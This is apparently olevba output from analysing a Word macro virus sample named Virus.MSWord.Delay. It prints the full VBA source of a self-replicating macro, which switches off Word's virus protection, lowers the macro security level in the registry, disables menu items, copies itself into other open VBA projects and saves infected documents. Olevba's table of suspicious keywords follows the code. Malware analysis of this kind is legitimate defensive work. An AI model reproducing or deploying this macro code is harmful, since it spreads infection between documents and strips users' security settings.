olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Delay
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Delay - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Blade.cls 
in file: Virus.MSWord.Delay - OLE stream: 'Macros/VBA/Blade'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
'Class.Blade
'code by Necronomikon
'greetz to:Gigabyte,jackie,SnakeByte,Lys Kovick,SerialKiller,Perikles,-KD-,SnakeMan,SlageHammer,dageshi,Ratter,#virus,#shadowvx,[6oCKeR],Fii7e,LISP
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayStatusBar = False
Options.ConfirmConversions = False
Options.VirusProtection = False
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.SaveNormalPrompt = False
Options.BlueScreen = True: Application.WindowState = wdWindowStateMaximize
CommandBars("Tools").Controls("Macro").Enabled = (99 - 99): CommandBars("File").Controls("Print Preview").Enabled = (99 - 99): CommandBars("Edit").Controls("Select All").Enabled = (99 - 99)
CommandBars("Edit").Controls("Undo VBA-Selection.TypeText").Enabled = (99 - 99):
CommandBars("Tools").Controls("Word Count...").Enabled = (99 - 99):
CommandBars("Tools").Controls("Options...").Enabled = (99 - 99)
For Each Target In Application.VBE.VBProjects
If Target.VBComponents(1).CodeModule.Lines(1, 1) = "" Then Target.VBComponents(1).CodeModule.addfromstring , ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 26)
Next
For i = 1 To Documents.Count
If Documents(i).Saved = False Then Documents(i).SaveAs Documents(i).FullName
Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\ControlPanel\Desktop", "MenuShowDelay") = "10000"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

